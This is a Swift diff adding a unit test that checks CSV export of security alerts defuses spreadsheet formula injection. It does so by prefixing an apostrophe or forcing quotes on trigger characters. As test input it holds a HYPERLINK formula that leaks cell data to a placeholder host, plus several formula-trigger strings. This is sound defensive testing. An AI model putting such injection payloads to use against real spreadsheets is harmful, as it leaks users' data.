@@ -20,6 +20,29 @@ final class ExportTests: XCTestCase {
         XCTAssertEqual(lines.count, 6, "letzte Zeile endet mit Umbruch, danach nichts")
     }
 
+    /// A file name off a watched share is attacker input. A cell that starts
+    /// with a formula trigger gets a leading `'`; a `;` or TAB forces quotes.
+    func testCSVDefusesFormulaTriggers() throws {
+        func row(files: [String], via: String) throws -> String {
+            let a: [String: Any] = ["id": 1, "at": "2026-09-05T15:44:45Z", "pid": 1, "identity": ["Unknown": ["path": "/tmp/@SUM(A1)"]], "files": files, "remote": NSNull(), "remote_port": NSNull(), "bytes_out": 5, "via": via, "verdict": "new"]
+            let line = String(decoding: try JSONSerialization.data(withJSONObject: ["Alerts": [a]]), as: UTF8.self)
+            guard case .alerts(let alerts) = try Response.decode(line) else { XCTFail("kein .alerts"); return "" }
+            return String(AlertExport.csv(alerts).dropFirst(AlertExport.csvHeader.count + 1).dropLast())
+        }
+        XCTAssertEqual(try row(files: [#"=HYPERLINK("http://x/?d="&A1,"click")"#], via: "a;b"),
+                       #"1,2026-09-05T15:44:45.000Z,'@SUM(A1),/tmp/@SUM(A1) [unsigned],1,,,5,"'=HYPERLINK(""http://x/?d=""&A1,""click"")","a;b",new,"#)
+        for (reason, cell) in [
+            ("=1+1", "'=1+1"), ("+1", "'+1"), ("-1", "'-1"), ("@SUM(A1)", "'@SUM(A1)"),
+            ("\t1", "\"'\t1\""), ("\r1", "\"'\r1\""), ("\u{FEFF}=1", "'\u{FEFF}=1"),
+            ("a\tb", "\"a\tb\""), ("a\r\nb", "\"a\r\nb\""), ("=\u{301}1", "'=\u{301}1"), ("a-b=c", "a-b=c"),
+            // Where a `;`-locale spreadsheet starts a new cell.
+            (" =1", "' =1"), ("x;=1+1;y", "\"x;'=1+1;y\""), ("a; -1", "\"a;' -1\""),
+            ("a\t@b", "\"a\t'@b\""), ("a\n=1", "\"a\n'=1\""), ("a\r\n=1", "\"a\r\n'=1\""),
+        ] {
+            XCTAssertEqual(AlertExport.csvField(reason), cell, reason.debugDescription)
+        }
+    }
+
     func testCSVEmptyIsHeaderOnly() {
         XCTAssertEqual(AlertExport.csv([]), AlertExport.csvHeader + "\n")
     }
